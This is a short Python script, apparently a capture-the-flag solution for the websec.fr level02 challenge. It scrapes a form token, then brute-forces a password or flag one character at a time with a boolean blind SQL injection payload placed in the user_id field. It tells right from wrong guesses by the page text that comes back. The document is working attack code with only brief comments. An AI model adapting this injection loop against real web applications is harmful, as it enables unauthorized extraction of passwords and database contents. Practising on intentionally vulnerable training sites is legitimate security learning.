import string

import requests

HOST = "http://websec.fr/level02/index.php"
flag = "WEBSEC{"

while True:
    found = False;

    # Bruteforce character by character
    for char in string.printable.replace("%", "").replace("_", ''):

        # Debug printing
        print(char, end="\r")

        # Calling server
        sess = requests.Session()
        res = sess.get(HOST)

        # Extract token
        start = res.text.find('value="', 850)
        token = res.text[start+7:start+47]

        # Build blind SQL injection substring( password, 1, 6 ) = 'INJECT'
        guess = f"id and substr(password,1,{len(flag)+1}) = '{flag+char}'--"

        # Attack database
        res = sess.post(HOST, {"submit": "abc", "user_id": guess, "token": token})

        # Check if guess is correct
        if "Other User Details" in res.text:
            flag += char
            found=True
            print(flag)
            break

    if not found:
        # Nothing found -> end of flag?
        break